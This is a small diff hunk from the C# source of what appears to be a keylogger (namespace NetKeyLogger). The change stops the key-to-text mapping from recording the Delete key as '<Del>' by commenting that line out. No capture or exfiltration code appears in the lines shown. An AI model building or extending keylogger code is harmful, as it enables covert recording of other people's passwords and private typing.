@@ -211,7 +211,8 @@ namespace NetKeyLogger
                     else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                         continue;
                     else if (Enum.GetName(typeof(Keys), i) == "Delete")
-                        keyBuffer += "<Del>";
+                        ;
+                    //keyBuffer += "<Del>";
                     else if (Enum.GetName(typeof(Keys), i) == "Insert")
                         keyBuffer += "<Ins>";
                     else if (Enum.GetName(typeof(Keys), i) == "Home")
